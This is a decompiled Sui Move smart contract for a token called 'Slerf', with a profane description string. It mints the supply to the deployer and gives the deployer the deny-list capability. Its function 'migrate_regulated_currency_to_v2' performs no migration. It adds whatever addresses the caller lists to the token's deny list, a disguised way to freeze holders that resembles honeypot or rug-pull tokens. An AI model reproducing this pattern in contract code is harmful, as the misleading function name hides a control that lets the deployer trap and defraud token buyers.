module 0xe9554cb9e73eacd27e70bc67e60f69c266cbbb12014b57f167f18c578682a6cf::SLERF {
    struct SLERF has drop {
        dummy_field: bool,
    }

    fun init(arg0: SLERF, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency<SLERF>(arg0, 2, b"Slerf", b"ou fuck", b"ou fuck", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://arweave.net/7ZQ2YW4U-pdRYwopPzxTydXawWPDIrVNyFhb3UZSYaU?ext=png")), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<SLERF>>(v2);
        0x2::transfer::public_transfer<0x2::coin::DenyCap<SLERF>>(v1, 0x2::tx_context::sender(arg1));
        let v3 = v0;
        0x2::coin::mint_and_transfer<SLERF>(&mut v3, 50000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<SLERF>>(v3, @0x0);
    }

    entry fun migrate_regulated_currency_to_v2(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCap<SLERF>, arg2: vector<address>, arg3: &mut 0x2::tx_context::TxContext) {
        let v0 = 0;
        while (v0 < 0x1::vector::length<address>(&mut arg2)) {
            let v1 = 0x1::vector::pop_back<address>(&mut arg2);
            if (!0x2::coin::deny_list_contains<SLERF>(arg0, v1)) {
                0x2::coin::deny_list_add<SLERF>(arg0, arg1, v1, arg3);
            };
            v0 = v0 + 1;
        };
    }

    // decompiled from Move bytecode v6
}

